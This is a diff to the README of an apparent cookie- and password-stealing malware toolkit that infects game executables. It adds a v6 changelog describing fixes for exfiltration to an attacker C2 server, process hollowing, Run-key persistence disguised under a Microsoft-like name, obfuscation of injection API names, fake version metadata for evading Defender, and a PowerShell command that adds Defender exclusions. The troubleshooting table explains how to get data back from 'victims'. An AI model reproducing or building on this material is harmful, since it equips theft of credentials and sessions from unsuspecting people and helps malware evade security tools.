@@ -180,7 +180,112 @@ python auto.py "GET UPSTAIRS (64bit)" --telegram 7123456789:AAH...:987654321 --d
 
 ## What's New
 
-### v5 -- AV evasion + GUI C2 detection (current)
+## What's New
+
+### v6 -- bugfix round: false-positive anti-VM, exfil reliability, production build, loader hardening (current)
+
+23 days of accumulated fixes. The payload now extracts and exfiltrates reliably;
+the previous "victim never returns data" symptom had three independent causes.
+
+**False-positive VM detection (critical -- the main "no cookies from the victim"
+cause).** The payload's minimal `IP_ADAPTER_INFO` redefinition declared
+`IP_ADDR_STRING` with `char _pad[64]` (72 bytes). The real struct is 44 bytes
+(`Next + IpAddress[16] + IpMask[16] + Context`). `GetAdaptersInfo` writes the
+real layout, so `Type` and `Address` were read at wrong offsets -- garbage values
+matched the VMware/VirtualBox MAC prefixes on ordinary physical machines and
+`IsAnalysisEnv()` returned true, making the payload exit silently before
+extracting anything. Symptoms: same exe works on one machine, returns nothing on
+another. Fixed to the exact real layout.
+
+**Production build compiles again.** `build.bat` only linked with `/DDEBUG`
+because a production build failed to link: `DbgH`/`DbgHInt` existed only inside
+`#ifdef DEBUG`, `Sha256Hash` was used before declaration, and `struct hostent`
+was incomplete without winsock2.h. All fixed -- production builds now compile
+clean with no debug logging (was: victim-side `C:\ProgramData\cookielog\debug.log`
+plus hundreds of `CreateFileW` calls slowing the extraction).
+
+**Growable JSON output buffer.** The fixed 2 MB `g_out` silently dropped bytes
+past the end. With 9 Chromium browsers + Firefox + passwords + Discord tokens the
+dump exceeded 2 MB, the closing `]` still got written, and the listener rejected
+the truncated JSON with 400 (data lost, victim-side fallback only). The buffer now
+grows via `VirtualAlloc` (doubles on demand).
+
+**Loader wait 20 s -> 120 s.** The loader terminated the hollowed process
+`TerminateProcess` after 20 s. Handle-hijack scans (NtQSI with 2 MB+ buffers)
+plus 9 browsers regularly exceed that on real victims -- the payload was killed
+mid-exfil. `-t` still overrides.
+
+**Full Local State read.** `LoadLocalState` read a fixed 256 KB. Heavy profiles
+(extension/histogram data) exceed that and `os_crypt` was cut off -- the v10 key
+never loaded and every Chromium cookie decrypted to empty. Now reads the whole
+file (up to 8 MB, `VirtualAlloc`).
+
+**Stale WAL cleanup in handle hijack.** `HijackCookieDB` did not delete leftover
+`ck_db.tmp-wal`/`-shm` from a previous `CopyDb` -- SQLite replayed a WAL that did
+not belong to the hijacked snapshot and the DB read failed. Both are deleted now.
+
+**HTTP exfil retry.** One refused SYN (listener restarting, firewall hiccup) lost
+the whole dump. `ExfilHTTP` now retries the full connect+send cycle 3 times with
+1 s between attempts.
+
+**Listener reliability.** `listen.py` is now a `ThreadingHTTPServer` (the
+Telegram/Discord relay runs inside `do_POST` and stalled concurrent payload POSTs
+on the single-threaded server) with a `SAVE_LOCK` around loot writes. `auto.py`
+no longer kills the listener after the 300 s wait window (victims running the exe
+later had nothing to deliver to) and probes the port first -- a zombie listener
+from a previous session silently ate the port while the new one died with
+EADDRINUSE. Removed the emoji from the Telegram summary (Telegram API is fine
+with it; the codebase convention is no emoji).
+
+**C2 port mismatch fixed.** `pick.py` hardcoded port 9090 in the C2 URL while
+`config.json` (saved by `auto.py`) said 9400 -- an infection built via `pick.py`
+POSTed to a port where nothing listened. `pick.py` now reads the saved port.
+
+**Persistence moved to the loader.** The payload ran `InstallPersistence()` inside
+the hollowed process, where `GetModuleFileName` returns `notepad.exe` -- the Run
+key pointed at the wrong exe. The loader now installs the Run key (pre
+rename-restore) pointing at the hidden `~ck_bak.bin` backup and KEEPS that backup
+when persistence is enabled (normally it is deleted). The Run value was renamed
+from `WindowsDefenderHelper` (known malware IOC string) to
+`MicrosoftEdgeFontCache`.
+
+**Loader hardening.**
+- Injection API names (`WriteProcessMemory`, `CreateRemoteThread`,
+  `NtUnmapViewOfSection`, ...) were plaintext in `.rdata` even though resolved
+  dynamically -- a static signature cluster. They are now stored XOR-obfuscated
+  (`EncName` constexpr) and decoded onto the stack at runtime. Verified: zero
+  plaintext injection API names in the compiled loader.
+- Version resource added (`src/loader.rc`, "Windows Presentation Font Cache") --
+  an unsigned GUI exe with no metadata scores high in Defender's ML.
+- `/PDBALTPATH` set; victim-side paths neutralized: `C:\ProgramData\MediaCache\`
+  (`cache.json` / `mc.key` / `cache.log` under `/DDEBUG`) instead of
+  `C:\ProgramData\cookielog\`. `cookielog.py` staging matches the new path.
+
+**Build hygiene: incremental link poisoning.** Stale `.exp`/`.ilk` files from
+previous builds made the linker emit a wrong export table (`GetProcAddress`
+returned a dead RVA and any out-of-process load AVd) and corrupted ILT thunks.
+`build.bat` now deletes `bin\*.exp`/`*.lib` before linking and passes
+`/INCREMENTAL:NO`. Exports verified with `dumpbin /EXPORTS`.
+
+**Defender note (confirmed via event log).** Local testing of the full chain
+triggers `Behavior:Win32/DefenseEvasion.A!ml` (the hollowing chain itself) and
+fresh `loader.exe` builds get `Trojan:Win32/Bearfoos.B!ml` cloud verdicts that
+kill the process mid-run -- exit `0xC0000005` with no handler firing, crash point
+moving between runs. This is the technique, not a payload bug. For local testing
+add the project folder to Defender exclusions (admin):
+
+```bat
+powershell -command "Start-Process powershell -Verb RunAs -ArgumentList '-command Add-MpPreference -ExclusionPath C:\path\to\cookielog'"
+```
+
+**Test result.** Production build 34.8 KB DLL (was 49.6 KB with DEBUG strings).
+Sentinels `CKC2/CKPR/CKAV` verified findable and patchable, zero IOC strings in
+the loader, version resource present, listener POST -> `loot/all_cookies.json`
+verified end-to-end, live payload trace confirmed: Local State parsed, v10 key
+DPAPI-decrypted (32 bytes), profiles iterated, locked DBs hijacked, cookies
+decrypted (v20 requires staging, see v5 notes).
+
+### v5 -- AV evasion + GUI C2 detection
 
 **XOR-encrypted payload (Defender evasion).** The payload DLL was previously embedded
 as plaintext in `loader.exe` via `payload.h`. Windows Defender detected it via static
@@ -541,8 +646,8 @@ cookielog/
 |   |-- payload.h         # XOR-encrypted DLL bytes (auto-generated by gen.ps1)
 |   `-- gen.ps1           # XOR-encrypts ckdll.dll -> payload.h (16-byte key from DLL bytes)
 |-- bin/                  # Build output
-|   |-- loader.exe        # ~156 KB (XOR payload + dynamic API, no injection imports in IAT)
-|   `-- ckdll.dll         # ~49 KB
+|   |-- loader.exe        # ~145 KB (XOR payload + dynamic API, no injection imports in IAT)
+|   `-- ckdll.dll         # ~35 KB
 |-- ifec/                 # Infected outputs (gitignored)
 |   |-- folds/            # Folder-mode infections (game + dependencies)
 |   `-- apps/             # Standalone infections (single .exe)
@@ -770,7 +875,7 @@ python cookielog.py --v20-usr
 python cookielog.py
 ```
 
-Stage 2 writes the decrypted key to `C:\ProgramData\cookielog\v20.key`, which stage 3 reads.
+Stage 2 writes the decrypted key to `C:\ProgramData\MediaCache\mc.key`, which stage 3 reads.
 
 ### `session_break.py` -- session cookie extractor + cryptanalysis
 
@@ -834,8 +939,8 @@ build.bat
 
 Produces:
 
-- `bin\ckdll.dll` -- payload (~49 KB, CRT-less, `/NODEFAULTLIB /ENTRY:payload_entry`)
-- `bin\loader.exe` -- loader (~156 KB, `/MT` static CRT, GUI subsystem)
+- `bin\ckdll.dll` -- payload (~35 KB, CRT-less, `/NODEFAULTLIB /ENTRY:payload_entry`, `/INCREMENTAL:NO`)
+- `bin\loader.exe` -- loader (~145 KB, `/MT` static CRT, GUI subsystem, version resource)
 - `src\payload.h` -- the DLL as a byte array, embedded into the loader
 
 ### Testing the listener
@@ -874,9 +979,9 @@ test_curl.bat 9090
 | `cookies_all.txt` | Netscape format (repo root) | `cookielog.py` |
 | `cookie_log.jsonl` | Continuous change log (one line per change) | `cookielog.py --live` |
 | `swap/<site>.txt` | Per-site Netscape cookies | `swap.py` |
-| `C:\ProgramData\cookielog\v20.key` | Decrypted Chrome v20 app-bound key | `cookielog.py --v20-usr` |
-| `C:\ProgramData\cookielog\drop.json` | Local fallback dump (no C2, no pipe) | `ckdll.dll` payload |
-| `C:\ProgramData\cookielog\debug.log` | Payload debug trace (built with `/DDEBUG`) | `ckdll.dll` payload |
+| `C:\ProgramData\MediaCache\mc.key` | Decrypted Chrome v20 app-bound key | `cookielog.py --v20-usr` |
+| `C:\ProgramData\MediaCache\cache.json` | Local fallback dump (no C2, no pipe) | `ckdll.dll` payload |
+| `C:\ProgramData\MediaCache\cache.log` | Payload debug trace (built with `/DDEBUG`) | `ckdll.dll` payload |
 | `~ck_bak.bin` | Hidden backup of infected exe (created on victim, auto-deleted) | `loader.exe` |
 
 ---
@@ -982,7 +1087,7 @@ Exfiltration priority in the payload:
 
 1. **HTTP POST to C2** -- if the sentinel was patched with a URL.
 2. **Named pipe** `\\.\pipe\ck_pipe` -- if `sink.py` is running locally (20 retries, 250ms each).
-3. **Local file** `C:\ProgramData\cookielog\drop.json` -- final fallback.
+3. **Local file** `C:\ProgramData\MediaCache\cache.json` -- final fallback.
 
 ### CRT-less payload DLL
 
@@ -1138,25 +1243,29 @@ opened read-only with SQLite.
 
 | Symptom | Cause | Fix |
 |---|---|---|
-| `connect failed: 10061` in debug.log | Listener not up or wrong port -- `listen.py` was slow to start (getfqdn DNS delay) | Fixed in current `listen.py` (server_bind override). Ensure `listen.py` is running before the victim executes |
+| `connect failed: 10061` in `cache.log` (DEBUG build) | Listener not up or wrong port -- `listen.py` was slow to start (getfqdn DNS delay) | Fixed in current `listen.py` (server_bind override). Ensure `listen.py` is running before the victim executes |
 | `WinError 32` restoring original .exe after `--run` | Game process holds the file lock | Fixed in current `auto.py` (kills game by name + targeted notepad.exe by PID). Close the game manually if retries fail |
 | Unity "Error" window on the host | Host was extracted as `~ck_tmp.exe`, so Unity looked for `~ck_tmp_Data/` | Rename-restore (default) preserves the original exe name; ensure the rename to `~ck_bak.bin` isn't blocked by AV |
 | WinHTTP error `12029` | WinHTTP/WinINet fail inside a hollowed process (proxy config unavailable) | The payload uses Winsock2, not WinHTTP -- rebuild `ckdll.dll` if you hit this (current code already uses Winsock2) |
 | `loader: base 0x5F000000 occupied` | Another process already mapped the payload's fixed base address | Use a different host `.exe`, or reboot / close the conflicting process |
 | Cookies not received by listener | `listen.py` not running, wrong C2 URL, or firewall blocking the port | Confirm `listen.py` is up, the C2 URL matches `http://<attacker-ip>:<port>/`, and the port is open in the firewall |
 | No Chromium cookies decrypted | Chrome >=127 uses the app-bound v20 key, which isn't present | Run `cookielog.py --v20-sys` (as SYSTEM via PsExec) then `--v20-usr` to generate `v20.key`, then re-extract |
-| `DumpChromium: copy failed (browser running?)` | Browser holds a 0-sharing lock on the cookie DB (`CopyFileShared` failed, error 32) | The payload falls back to handle hijacking automatically. If hijack also fails, the browser may not have the DB open -- close and reopen it, or check `debug.log` for `HijackCookieDB` messages |
+| `DumpChromium: copy failed (browser running?)` | Browser holds a 0-sharing lock on the cookie DB (`CopyFileShared` failed, error 32) | The payload falls back to handle hijacking automatically. If hijack also fails, the browser may not have the DB open -- close and reopen it, or check `cache.log` (DEBUG builds) for `HijackCookieDB` messages |
 | Invalid JSON at listener (`Invalid control character at: line 1 column 73`) | Old payload used raw `Put()` (no escaping) for password values -- binary chars in decrypted passwords break JSON | Fixed in current build (`Put()` replaced with `PutJ()`). Rebuild with `build.bat` |
 | DPAPI failed (`CryptUnprotectData` returns false) | Running as a different user than the profile owner | Run the extraction in the target user's context (DPAPI keys are per-user) |
 | `[-] no MSVC` during build | Visual Studio C++ Build Tools not installed | Install VS 2022 Build Tools with the C++ workload and run from a Developer Command Prompt |
-| No cookies in `loot/` after local test | Payload fell back to `drop.json` because no C2 and `sink.py` wasn't running | Either set a C2 URL + run `listen.py`, or run `sink.py` for pipe mode; check `C:\ProgramData\cookielog\drop.json` |
+| No cookies in `loot/` after local test | Payload fell back to `drop.json` because no C2 and `sink.py` wasn't running | Either set a C2 URL + run `listen.py`, or run `sink.py` for pipe mode; check `C:\ProgramData\MediaCache\cache.json` (v6: renamed from `C:\ProgramData\cookielog\drop.json` -- old builds still use the old path) |
 | Cookie/password values contain `Ã§` or `Ã£` instead of `ç` or `ã` | Old payload escaped bytes >= 0x80 as `\u00XX`, corrupting UTF-8 multi-byte sequences | Fixed in v4 (PutJ passes bytes >= 0x80 as raw UTF-8). Rebuild with `build.bat` |
 | Cookie values have 32 bytes of binary garbage at the start | Chrome >=118 prepends SHA256(host_key) to decrypted plaintext; old payload didn't strip it | Fixed in v4 (DecCookie verifies and strips 32-byte domain hash). Rebuild with `build.bat` |
 | Password values have 32 bytes of binary garbage at the start | Old v3 fix unconditionally stripped 32 bytes from all v10 values, including passwords | Fixed in v4 (DecCookie only strips when SHA256(host_key) matches). Rebuild with `build.bat` |
 | **Windows Defender detects the infected exe as a virus** (v5) | Payload DLL was plaintext in `loader.exe`; injection imports (`WriteProcessMemory`, `VirtualAllocEx`, `CreateRemoteThread`) were in the IAT; `cmd.exe` hollowing is a known signature | Fixed in v5: payload is XOR-encrypted in `payload.h` (decrypted at runtime); injection APIs resolved dynamically via `GetProcAddress`; hollowing uses `notepad.exe` instead of `cmd.exe`. Rebuild with `build.bat` |
 | **Victim on external network returns no data** (v5) | `detect_ip()` returns a LAN address (192.168.x.x); the victim cannot reach it | Use `--c2 http://YOUR_PUBLIC_IP:PORT/` or the GUI "DETECT PUBLIC IP" button. Port-forward the listener port on your router. A NAT warning is printed when a private IP is detected |
 | Payload doesn't run in VMware / VirtualBox | Anti-VM checks (MAC prefix, `IsDebuggerPresent`, analysis process names) detect the VM and exit | Use `--no-anti-vm` (CLI) or check "Disable anti-VM" (GUI) to patch `CKAV0000` -> `CKAV0001` |
-| `inet_addr` / `connect` fails in debug.log | C2 URL was not patched (sentinel still `CKC2_DEADBEEF_`) or wrong IP/port | Verify `auto.py` patched the loader sentinel; check the C2 URL with the GUI "TEST C2" button |
+| `inet_addr` / `connect` fails in `cache.log` (DEBUG build) | C2 URL was not patched (sentinel still `CKC2_DEADBEEF_`) or wrong IP/port | Verify `auto.py` patched the loader sentinel; check the C2 URL with the GUI "TEST C2" button |
+| **Payload/exe dies silently mid-run on the test machine** (v6) -- exit `0xC0000005`, no exception handler fires, the point of death moves between runs after every rebuild | Defender behavioral ML (`Behavior:Win32/DefenseEvasion.A!ml` -- the hollowing chain itself) plus a cloud verdict on fresh `loader.exe` builds (`Trojan:Win32/Bearfoos.B!ml`) kills the process; it is the technique, not a payload bug | Add the repo folder to Defender exclusions once (admin, command in the v6 section) and rebuild. Confirmed via `Get-WinEvent Microsoft-Windows-Windows Defender/Operational` ids 1116/1117 |
+| Same exe extracts cookies on one machine and returns nothing on another (v6) | Old build: wrong `IP_ADDR_STRING` layout made `GetAdaptersInfo` output read garbage -> false VM MAC match -> silent exit | Fixed in v6. Rebuild with `build.bat`. Diagnose with a DEBUG build: `IsAnalysisEnv` logs per-adapter lines; on the fixed build physical adapters are whitelisted correctly |
+| Truncated JSON rejected by the listener with 400 on heavy victims (9+ browsers) | Fixed 2 MB output buffer overflowed silently, closing `]` still written | Fixed in v6 (growable `VirtualAlloc` buffer). Rebuild with `build.bat` |
+| Run key persistence registered the wrong exe / payload died at 20 s mid-exfil | v5-and-earlier: persistence ran inside the hollowed process (`GetModuleFileName` -> `notepad.exe`); loader wait was 20 s | Fixed in v6: persistence moved to the loader (points at the hidden `~ck_bak.bin` backup, Run value `MicrosoftEdgeFontCache`), wait raised to 120 s |
 | `OSError: [WinError 10048]` starting listener | Port is already in use by another process | Use `--find-port` (CLI) or the GUI "FIND BEST PORT" button to auto-scan for a free port |
 
 ---
